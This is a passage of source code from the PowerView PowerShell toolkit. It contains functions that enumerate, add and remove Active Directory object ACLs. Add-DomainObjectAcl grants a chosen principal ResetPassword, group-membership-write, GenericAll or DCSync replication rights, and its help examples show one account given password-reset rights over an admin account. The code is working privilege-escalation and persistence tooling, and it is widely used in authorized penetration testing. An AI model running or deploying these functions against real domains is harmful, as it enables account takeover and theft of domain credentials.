        if ($PSBoundParameters['ResultPageSize']) { $DomainGUIDMapArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $DomainGUIDMapArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Credential']) { $DomainGUIDMapArguments['Credential'] = $Credential }

        # get a GUID -> name mapping
        if ($PSBoundParameters['ResolveGUIDs']) {
            $GUIDs = Get-DomainGUIDMap @DomainGUIDMapArguments
        }
    }

    PROCESS {
        if ($Searcher) {
            $IdentityFilter = ''
            $Filter = ''
            $Identity | Where-Object {$_} | ForEach-Object {
                $IdentityInstance = $_.Replace('(', '\28').Replace(')', '\29')
                if ($IdentityInstance -match '^S-1-.*') {
                    $IdentityFilter += "(objectsid=$IdentityInstance)"
                }
                elseif ($IdentityInstance -match '^(CN|OU|DC)=.*') {
                    $IdentityFilter += "(distinguishedname=$IdentityInstance)"
                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                        # if a -Domain isn't explicitly set, extract the object domain out of the distinguishedname
                        #   and rebuild the domain searcher
                        $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        Write-Verbose "[Get-DomainObjectAcl] Extracted domain '$IdentityDomain' from '$IdentityInstance'"
                        $SearcherArguments['Domain'] = $IdentityDomain
                        $Searcher = Get-DomainSearcher @SearcherArguments
                        if (-not $Searcher) {
                            Write-Warning "[Get-DomainObjectAcl] Unable to retrieve domain searcher for '$IdentityDomain'"
                        }
                    }
                }
                elseif ($IdentityInstance -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                    $GuidByteString = (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
                    $IdentityFilter += "(objectguid=$GuidByteString)"
                }
                elseif ($IdentityInstance.Contains('.')) {
                    $IdentityFilter += "(|(samAccountName=$IdentityInstance)(name=$IdentityInstance)(dnshostname=$IdentityInstance))"
                }
                else {
                    $IdentityFilter += "(|(samAccountName=$IdentityInstance)(name=$IdentityInstance)(displayname=$IdentityInstance))"
                }
            }
            if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {
                $Filter += "(|$IdentityFilter)"
            }

            if ($PSBoundParameters['LDAPFilter']) {
                Write-Verbose "[Get-DomainObjectAcl] Using additional LDAP filter: $LDAPFilter"
                $Filter += "$LDAPFilter"
            }

            if ($Filter) {
                $Searcher.filter = "(&$Filter)"
            }
            Write-Verbose "[Get-DomainObjectAcl] Get-DomainObjectAcl filter string: $($Searcher.filter)"

            $Results = $Searcher.FindAll()
            $Results | Where-Object {$_} | ForEach-Object {
                $Object = $_.Properties

                if ($Object.objectsid -and $Object.objectsid[0]) {
                    $ObjectSid = (New-Object System.Security.Principal.SecurityIdentifier($Object.objectsid[0],0)).Value
                }
                else {
                    $ObjectSid = $Null
                }

                try {
                    New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $Object['ntsecuritydescriptor'][0], 0 | ForEach-Object { if ($PSBoundParameters['Sacl']) {$_.SystemAcl} else {$_.DiscretionaryAcl} } | ForEach-Object {
                        if ($PSBoundParameters['RightsFilter']) {
                            $GuidFilter = Switch ($RightsFilter) {
                                'ResetPassword' { '00299570-246d-11d0-a768-00aa006e0529' }
                                'WriteMembers' { 'bf9679c0-0de6-11d0-a285-00aa003049e2' }
                                Default { '00000000-0000-0000-0000-000000000000' }
                            }
                            if ($_.ObjectType -eq $GuidFilter) {
                                $_ | Add-Member NoteProperty 'ObjectDN' $Object.distinguishedname[0]
                                $_ | Add-Member NoteProperty 'ObjectSID' $ObjectSid
                                $Continue = $True
                            }
                        }
                        else {
                            $_ | Add-Member NoteProperty 'ObjectDN' $Object.distinguishedname[0]
                            $_ | Add-Member NoteProperty 'ObjectSID' $ObjectSid
                            $Continue = $True
                        }

                        if ($Continue) {
                            $_ | Add-Member NoteProperty 'ActiveDirectoryRights' ([Enum]::ToObject([System.DirectoryServices.ActiveDirectoryRights], $_.AccessMask))
                            if ($GUIDs) {
                                # if we're resolving GUIDs, map them them to the resolved hash table
                                $AclProperties = @{}
                                $_.psobject.properties | ForEach-Object {
                                    if ($_.Name -match 'ObjectType|InheritedObjectType|ObjectAceType|InheritedObjectAceType') {
                                        try {
                                            $AclProperties[$_.Name] = $GUIDs[$_.Value.toString()]
                                        }
                                        catch {
                                            $AclProperties[$_.Name] = $_.Value
                                        }
                                    }
                                    else {
                                        $AclProperties[$_.Name] = $_.Value
                                    }
                                }
                                $OutObject = New-Object -TypeName PSObject -Property $AclProperties
                                $OutObject.PSObject.TypeNames.Insert(0, 'PowerView.ACL')
                                $OutObject
                            }
                            else {
                                $_.PSObject.TypeNames.Insert(0, 'PowerView.ACL')
                                $_
                            }
                        }
                    }
                }
                catch {
                    Write-Verbose "[Get-DomainObjectAcl] Error: $_"
                }
            }
        }
    }
}


function Add-DomainObjectAcl {
<#
.SYNOPSIS

Adds an ACL for a specific active directory object.

AdminSDHolder ACL approach from Sean Metcalf (@pyrotek3): https://adsecurity.org/?p=1906

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainObject  

.DESCRIPTION

This function modifies the ACL/ACE entries for a given Active Directory
target object specified by -TargetIdentity. Available -Rights are
'All', 'ResetPassword', 'WriteMembers', 'DCSync', or a manual extended
rights GUID can be set with -RightsGUID. These rights are granted on the target
object for the specified -PrincipalIdentity.

.PARAMETER TargetIdentity

A SamAccountName (e.g. harmj0y), DistinguishedName (e.g. CN=harmj0y,CN=Users,DC=testlab,DC=local),
SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1108), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201)
for the domain object to modify ACLs for. Required. Wildcards accepted.

.PARAMETER TargetDomain

Specifies the domain for the TargetIdentity to use for the modification, defaults to the current domain.

.PARAMETER TargetLDAPFilter

Specifies an LDAP query string that is used to filter Active Directory object targets.

.PARAMETER TargetSearchBase

The LDAP source to search through for targets, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
Useful for OU queries.

.PARAMETER PrincipalIdentity

A SamAccountName (e.g. harmj0y), DistinguishedName (e.g. CN=harmj0y,CN=Users,DC=testlab,DC=local),
SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1108), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201)
for the domain principal to add for the ACL. Required. Wildcards accepted.

.PARAMETER PrincipalDomain

Specifies the domain for the TargetIdentity to use for the principal, defaults to the current domain.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.PARAMETER Rights

Rights to add for the principal, 'All', 'ResetPassword', 'WriteMembers', 'DCSync'.
Defaults to 'All'.

.PARAMETER RightsGUID

Manual GUID representing the right to add to the target.

.EXAMPLE

$Harmj0ySid = Get-DomainUser harmj0y | Select-Object -ExpandProperty objectsid
Get-DomainObjectACL dfm.a -ResolveGUIDs | Where-Object {$_.securityidentifier -eq $Harmj0ySid}

...

Add-DomainObjectAcl -TargetIdentity dfm.a -PrincipalIdentity harmj0y -Rights ResetPassword -Verbose
VERBOSE: [Get-DomainSearcher] search string: LDAP://PRIMARY.testlab.local/DC=testlab,DC=local
VERBOSE: [Get-DomainObject] Get-DomainObject filter string: (&(|(samAccountName=harmj0y)))
VERBOSE: [Get-DomainSearcher] search string: LDAP://PRIMARY.testlab.local/DC=testlab,DC=local
VERBOSE: [Get-DomainObject] Get-DomainObject filter string:(&(|(samAccountName=dfm.a)))
VERBOSE: [Add-DomainObjectAcl] Granting principal CN=harmj0y,CN=Users,DC=testlab,DC=local 'ResetPassword' on CN=dfm (admin),CN=Users,DC=testlab,DC=local
VERBOSE: [Add-DomainObjectAcl] Granting principal CN=harmj0y,CN=Users,DC=testlab,DC=local rights GUID '00299570-246d-11d0-a768-00aa006e0529' on CN=dfm (admin),CN=Users,DC=testlab,DC=local

Get-DomainObjectACL dfm.a -ResolveGUIDs | Where-Object {$_.securityidentifier -eq $Harmj0ySid }

AceQualifier           : AccessAllowed
ObjectDN               : CN=dfm (admin),CN=Users,DC=testlab,DC=local
ActiveDirectoryRights  : ExtendedRight
ObjectAceType          : User-Force-Change-Password
ObjectSID              : S-1-5-21-890171859-3433809279-3366196753-1114
InheritanceFlags       : None
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-890171859-3433809279-3366196753-1108
AccessMask             : 256
AuditFlags             : None
IsInherited            : False
AceFlags               : None
InheritedObjectAceType : All
OpaqueLength           : 0

.EXAMPLE

$Harmj0ySid = Get-DomainUser harmj0y | Select-Object -ExpandProperty objectsid
Get-DomainObjectACL testuser -ResolveGUIDs | Where-Object {$_.securityidentifier -eq $Harmj0ySid}

[no results returned]

$SecPassword = ConvertTo-SecureString 'Password123!'-AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Add-DomainObjectAcl -TargetIdentity testuser -PrincipalIdentity harmj0y -Rights ResetPassword -Credential $Cred -Verbose
VERBOSE: [Get-Domain] Using alternate credentials for Get-Domain
VERBOSE: [Get-Domain] Extracted domain 'TESTLAB' from -Credential
VERBOSE: [Get-DomainSearcher] search string: LDAP://PRIMARY.testlab.local/DC=testlab,DC=local
VERBOSE: [Get-DomainSearcher] Using alternate credentials for LDAP connection
VERBOSE: [Get-DomainObject] Get-DomainObject filter string: (&(|(|(samAccountName=harmj0y)(name=harmj0y))))
VERBOSE: [Get-Domain] Using alternate credentials for Get-Domain
VERBOSE: [Get-Domain] Extracted domain 'TESTLAB' from -Credential
VERBOSE: [Get-DomainSearcher] search string: LDAP://PRIMARY.testlab.local/DC=testlab,DC=local
VERBOSE: [Get-DomainSearcher] Using alternate credentials for LDAP connection
VERBOSE: [Get-DomainObject] Get-DomainObject filter string: (&(|(|(samAccountName=testuser)(name=testuser))))
VERBOSE: [Add-DomainObjectAcl] Granting principal CN=harmj0y,CN=Users,DC=testlab,DC=local 'ResetPassword' on CN=testuser testuser,CN=Users,DC=testlab,DC=local
VERBOSE: [Add-DomainObjectAcl] Granting principal CN=harmj0y,CN=Users,DC=testlab,DC=local rights GUID '00299570-246d-11d0-a768-00aa006e0529' on CN=testuser,CN=Users,DC=testlab,DC=local

Get-DomainObjectACL testuser -ResolveGUIDs | Where-Object {$_.securityidentifier -eq $Harmj0ySid }

AceQualifier           : AccessAllowed
ObjectDN               : CN=dfm (admin),CN=Users,DC=testlab,DC=local
ActiveDirectoryRights  : ExtendedRight
ObjectAceType          : User-Force-Change-Password
ObjectSID              : S-1-5-21-890171859-3433809279-3366196753-1114
InheritanceFlags       : None
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-890171859-3433809279-3366196753-1108
AccessMask             : 256
AuditFlags             : None
IsInherited            : False
AceFlags               : None
InheritedObjectAceType : All
OpaqueLength           : 0

.LINK

https://adsecurity.org/?p=1906
https://social.technet.microsoft.com/Forums/windowsserver/en-US/df3bfd33-c070-4a9c-be98-c4da6e591a0a/forum-faq-using-powershell-to-assign-permissions-on-active-directory-objects?forum=winserverpowershell
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        $TargetIdentity,

        [ValidateNotNullOrEmpty()]
        [String]
        $TargetDomain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $TargetLDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String]
        $TargetSearchBase,

        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $PrincipalIdentity,

        [ValidateNotNullOrEmpty()]
        [String]
        $PrincipalDomain,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [ValidateSet('All', 'ResetPassword', 'WriteMembers', 'DCSync')]
        [String]
        $Rights = 'All',

        [Guid]
        $RightsGUID
    )

    BEGIN {
        $TargetSearcherArguments = @{
            'Properties' = 'distinguishedname'
            'Raw' = $True
        }
        if ($PSBoundParameters['TargetDomain']) { $TargetSearcherArguments['Domain'] = $TargetDomain }
        if ($PSBoundParameters['TargetLDAPFilter']) { $TargetSearcherArguments['LDAPFilter'] = $TargetLDAPFilter }
        if ($PSBoundParameters['TargetSearchBase']) { $TargetSearcherArguments['SearchBase'] = $TargetSearchBase }
        if ($PSBoundParameters['Server']) { $TargetSearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $TargetSearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $TargetSearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $TargetSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $TargetSearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $TargetSearcherArguments['Credential'] = $Credential }

        $PrincipalSearcherArguments = @{
            'Identity' = $PrincipalIdentity
            'Properties' = 'distinguishedname,objectsid'
        }
        if ($PSBoundParameters['PrincipalDomain']) { $PrincipalSearcherArguments['Domain'] = $PrincipalDomain }
        if ($PSBoundParameters['Server']) { $PrincipalSearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $PrincipalSearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $PrincipalSearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $PrincipalSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $PrincipalSearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $PrincipalSearcherArguments['Credential'] = $Credential }
        $Principals = Get-DomainObject @PrincipalSearcherArguments
        if (-not $Principals) {
            throw "Unable to resolve principal: $PrincipalIdentity"
        }
    }

    PROCESS {
        $TargetSearcherArguments['Identity'] = $TargetIdentity
        $Targets = Get-DomainObject @TargetSearcherArguments

        ForEach ($TargetObject in $Targets) {

            $InheritanceType = [System.DirectoryServices.ActiveDirectorySecurityInheritance] 'None'
            $ControlType = [System.Security.AccessControl.AccessControlType] 'Allow'
            $ACEs = @()

            if ($RightsGUID) {
                $GUIDs = @($RightsGUID)
            }
            else {
                $GUIDs = Switch ($Rights) {
                    # ResetPassword doesn't need to know the user's current password
                    'ResetPassword' { '00299570-246d-11d0-a768-00aa006e0529' }
                    # allows for the modification of group membership
                    'WriteMembers' { 'bf9679c0-0de6-11d0-a285-00aa003049e2' }
                    # 'DS-Replication-Get-Changes' = 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2
                    # 'DS-Replication-Get-Changes-All' = 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2
                    # 'DS-Replication-Get-Changes-In-Filtered-Set' = 89e95b76-444d-4c62-991a-0facbeda640c
                    #   when applied to a domain's ACL, allows for the use of DCSync
                    'DCSync' { '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2', '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2', '89e95b76-444d-4c62-991a-0facbeda640c'}
                }
            }

            ForEach ($PrincipalObject in $Principals) {
                Write-Verbose "[Add-DomainObjectAcl] Granting principal $($PrincipalObject.distinguishedname) '$Rights' on $($TargetObject.Properties.distinguishedname)"

                try {
                    $Identity = [System.Security.Principal.IdentityReference] ([System.Security.Principal.SecurityIdentifier]$PrincipalObject.objectsid)

                    if ($GUIDs) {
                        ForEach ($GUID in $GUIDs) {
                            $NewGUID = New-Object Guid $GUID
                            $ADRights = [System.DirectoryServices.ActiveDirectoryRights] 'ExtendedRight'
                            $ACEs += New-Object System.DirectoryServices.ActiveDirectoryAccessRule $Identity, $ADRights, $ControlType, $NewGUID, $InheritanceType
                        }
                    }
                    else {
                        # deault to GenericAll rights
                        $ADRights = [System.DirectoryServices.ActiveDirectoryRights] 'GenericAll'
                        $ACEs += New-Object System.DirectoryServices.ActiveDirectoryAccessRule $Identity, $ADRights, $ControlType, $InheritanceType
                    }

                    # add all the new ACEs to the specified object directory entry
                    ForEach ($ACE in $ACEs) {
                        Write-Verbose "[Add-DomainObjectAcl] Granting principal $($PrincipalObject.distinguishedname) rights GUID '$($ACE.ObjectType)' on $($TargetObject.Properties.distinguishedname)"
                        $TargetEntry = $TargetObject.GetDirectoryEntry()
                        $TargetEntry.PsBase.Options.SecurityMasks = 'Dacl'
                        $TargetEntry.PsBase.ObjectSecurity.AddAccessRule($ACE)
                        $TargetEntry.PsBase.CommitChanges()
                    }
                }
                catch {
                    Write-Verbose "[Add-DomainObjectAcl] Error granting principal $($PrincipalObject.distinguishedname) '$Rights' on $($TargetObject.Properties.distinguishedname) : $_"
                }
            }
        }
    }
}


function Remove-DomainObjectAcl {
<#
.SYNOPSIS

Removes an ACL from a specific active directory object.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainObject  

.DESCRIPTION

This function modifies the ACL/ACE entries for a given Active Directory
target object specified by -TargetIdentity. Available -Rights are
'All', 'ResetPassword', 'WriteMembers', 'DCSync', or a manual extended
rights GUID can be set with -RightsGUID. These rights are removed from the target
object for the specified -PrincipalIdentity.

.PARAMETER TargetIdentity

A SamAccountName (e.g. harmj0y), DistinguishedName (e.g. CN=harmj0y,CN=Users,DC=testlab,DC=local),
SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1108), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201)
for the domain object to modify ACLs for. Required. Wildcards accepted.

.PARAMETER TargetDomain

Specifies the domain for the TargetIdentity to use for the modification, defaults to the current domain.

.PARAMETER TargetLDAPFilter

Specifies an LDAP query string that is used to filter Active Directory object targets.

.PARAMETER TargetSearchBase

The LDAP source to search through for targets, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
Useful for OU queries.

.PARAMETER PrincipalIdentity

A SamAccountName (e.g. harmj0y), DistinguishedName (e.g. CN=harmj0y,CN=Users,DC=testlab,DC=local),
SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1108), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201)
for the domain principal to add for the ACL. Required. Wildcards accepted.

.PARAMETER PrincipalDomain

Specifies the domain for the TargetIdentity to use for the principal, defaults to the current domain.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.PARAMETER Rights

Rights to add for the principal, 'All', 'ResetPassword', 'WriteMembers', 'DCSync'.
Defaults to 'All'.

.PARAMETER RightsGUID

Manual GUID representing the right to add to the target.

.EXAMPLE

$UserSID = Get-DomainUser user | Select-Object -ExpandProperty objectsid
Get-DomainObjectACL user2 -ResolveGUIDs | Where-Object {$_.securityidentifier -eq $UserSID}

[no results returned]

Add-DomainObjectAcl -TargetIdentity user2 -PrincipalIdentity user -Rights ResetPassword

Get-DomainObjectACL user2 -ResolveGUIDs | Where-Object {$_.securityidentifier -eq $UserSID }

AceQualifier           : AccessAllowed
ObjectDN               : CN=user2,CN=Users,DC=testlab,DC=local
ActiveDirectoryRights  : ExtendedRight
ObjectAceType          : User-Force-Change-Password
ObjectSID              : S-1-5-21-883232822-274137685-4173207997-2105
InheritanceFlags       : None
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-883232822-274137685-4173207997-2104
AccessMask             : 256
AuditFlags             : None
IsInherited            : False
AceFlags               : None
InheritedObjectAceType : All
OpaqueLength           : 0


Remove-DomainObjectAcl -TargetIdentity user2 -PrincipalIdentity user -Rights ResetPassword

Get-DomainObjectACL user2 -ResolveGUIDs | Where-Object {$_.securityidentifier -eq $UserSID}

[no results returned]

.LINK

https://social.technet.microsoft.com/Forums/windowsserver/en-US/df3bfd33-c070-4a9c-be98-c4da6e591a0a/forum-faq-using-powershell-to-assign-permissions-on-active-directory-objects?forum=winserverpowershell
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        $TargetIdentity,

        [ValidateNotNullOrEmpty()]
        [String]
        $TargetDomain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $TargetLDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String]
        $TargetSearchBase,

        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $PrincipalIdentity,

        [ValidateNotNullOrEmpty()]
        [String]
        $PrincipalDomain,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [ValidateSet('All', 'ResetPassword', 'WriteMembers', 'DCSync')]
        [String]
        $Rights = 'All',

        [Guid]
        $RightsGUID
    )

    BEGIN {
        $TargetSearcherArguments = @{
            'Properties' = 'distinguishedname'
            'Raw' = $True
        }
        if ($PSBoundParameters['TargetDomain']) { $TargetSearcherArguments['Domain'] = $TargetDomain }
        if ($PSBoundParameters['TargetLDAPFilter']) { $TargetSearcherArguments['LDAPFilter'] = $TargetLDAPFilter }
        if ($PSBoundParameters['TargetSearchBase']) { $TargetSearcherArguments['SearchBase'] = $TargetSearchBase }
        if ($PSBoundParameters['Server']) { $TargetSearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $TargetSearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $TargetSearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $TargetSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $TargetSearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $TargetSearcherArguments['Credential'] = $Credential }

        $PrincipalSearcherArguments = @{
            'Identity' = $PrincipalIdentity
            'Properties' = 'distinguishedname,objectsid'
        }
        if ($PSBoundParameters['PrincipalDomain']) { $PrincipalSearcherArguments['Domain'] = $PrincipalDomain }
        if ($PSBoundParameters['Server']) { $PrincipalSearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $PrincipalSearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $PrincipalSearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $PrincipalSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $PrincipalSearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $PrincipalSearcherArguments['Credential'] = $Credential }
        $Principals = Get-DomainObject @PrincipalSearcherArguments
        if (-not $Principals) {
            throw "Unable to resolve principal: $PrincipalIdentity"
        }
    }

    PROCESS {
        $TargetSearcherArguments['Identity'] = $TargetIdentity
        $Targets = Get-DomainObject @TargetSearcherArguments

        ForEach ($TargetObject in $Targets) {

            $InheritanceType = [System.DirectoryServices.ActiveDirectorySecurityInheritance] 'None'
            $ControlType = [System.Security.AccessControl.AccessControlType] 'Allow'
            $ACEs = @()

            if ($RightsGUID) {
                $GUIDs = @($RightsGUID)
            }
            else {
                $GUIDs = Switch ($Rights) {
                    # ResetPassword doesn't need to know the user's current password
                    'ResetPassword' { '00299570-246d-11d0-a768-00aa006e0529' }
                    # allows for the modification of group membership
                    'WriteMembers' { 'bf9679c0-0de6-11d0-a285-00aa003049e2' }
                    # 'DS-Replication-Get-Changes' = 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2
                    # 'DS-Replication-Get-Changes-All' = 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2
                    # 'DS-Replication-Get-Changes-In-Filtered-Set' = 89e95b76-444d-4c62-991a-0facbeda640c
                    #   when applied to a domain's ACL, allows for the use of DCSync
                    'DCSync' { '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2', '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2', '89e95b76-444d-4c62-991a-0facbeda640c'}
                }
            }

            ForEach ($PrincipalObject in $Principals) {
                Write-Verbose "[Remove-DomainObjectAcl] Removing principal $($PrincipalObject.distinguishedname) '$Rights' from $($TargetObject.Properties.distinguishedname)"

                try {
                    $Identity = [System.Security.Principal.IdentityReference] ([System.Security.Principal.SecurityIdentifier]$PrincipalObject.objectsid)

                    if ($GUIDs) {
                        ForEach ($GUID in $GUIDs) {
                            $NewGUID = New-Object Guid $GUID
                            $ADRights = [System.DirectoryServices.ActiveDirectoryRights] 'ExtendedRight'
                            $ACEs += New-Object System.DirectoryServices.ActiveDirectoryAccessRule $Identity, $ADRights, $ControlType, $NewGUID, $InheritanceType
                        }
                    }
                    else {
                        # deault to GenericAll rights
                        $ADRights = [System.DirectoryServices.ActiveDirectoryRights] 'GenericAll'
                        $ACEs += New-Object System.DirectoryServices.ActiveDirectoryAccessRule $Identity, $ADRights, $ControlType, $InheritanceType
                    }

                    # remove all the specified ACEs from the specified object directory entry
                    ForEach ($ACE in $ACEs) {
                        Write-Verbose "[Remove-DomainObjectAcl] Granting principal $($PrincipalObject.distinguishedname) rights GUID '$($ACE.ObjectType)' on $($TargetObject.Properties.distinguishedname)"
                        $TargetEntry = $TargetObject.GetDirectoryEntry()
                        $TargetEntry.PsBase.Options.SecurityMasks = 'Dacl'
                        $TargetEntry.PsBase.ObjectSecurity.RemoveAccessRule($ACE)
                        $TargetEntry.PsBase.CommitChanges()
                    }
                }
                catch {
                    Write-Verbose "[Remove-DomainObjectAcl] Error removing principal $($PrincipalObject.distinguishedname) '$Rights' from $($TargetObject.Properties.distinguishedname) : $_"
                }
            }
        }
    }
}


function Find-InterestingDomainAcl {
<#
.SYNOPSIS

Finds object ACLs in the current (or specified) domain with modification
rights set to non-built in objects.

Thanks Sean Metcalf (@pyrotek3) for the idea and guidance.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainObjectAcl, Get-DomainObject, Convert-ADName  

.DESCRIPTION

This function enumerates the ACLs for every object in the domain with Get-DomainObjectAcl,
and for each returned ACE entry it checks if principal security identifier
is *-1000 (meaning the account is not built in), and also checks if the rights for
the ACE mean the object can be modified by the principal. If these conditions are met,
then the security identifier SID is translated, the domain object is retrieved, and
additional IdentityReference* information is appended to the output object.

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER ResolveGUIDs

Switch. Resolve GUIDs to their display names.

.PARAMETER LDAPFilter

Specifies an LDAP query string that is used to filter Active Directory objects.

.PARAMETER SearchBase

The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Find-InterestingDomainAcl

Finds interesting object ACLS in the current domain.

.EXAMPLE

Find-InterestingDomainAcl -Domain dev.testlab.local -ResolveGUIDs

Finds interesting object ACLS in the ev.testlab.local domain and
resolves rights GUIDs to display names.

.EXAMPLE

